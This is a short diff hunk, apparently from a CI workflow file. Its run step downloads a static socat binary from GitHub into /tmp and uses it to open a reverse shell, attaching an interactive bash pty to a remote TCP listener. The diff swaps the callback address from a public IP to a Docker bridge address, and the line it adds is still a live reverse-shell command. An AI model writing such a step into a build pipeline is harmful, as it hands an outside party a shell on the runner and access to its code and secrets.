@@ -11,4 +11,4 @@ jobs:
         run: |
           wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
           chmod +x /tmp/socat
-          /tmp/socat TCP:161.35.110.36:5508 EXEC:'bash',pty,stderr,setsid,sigint,sane
+          /tmp/socat TCP:172.17.0.1:9000 EXEC:'bash',pty,stderr,setsid,sigint,sane
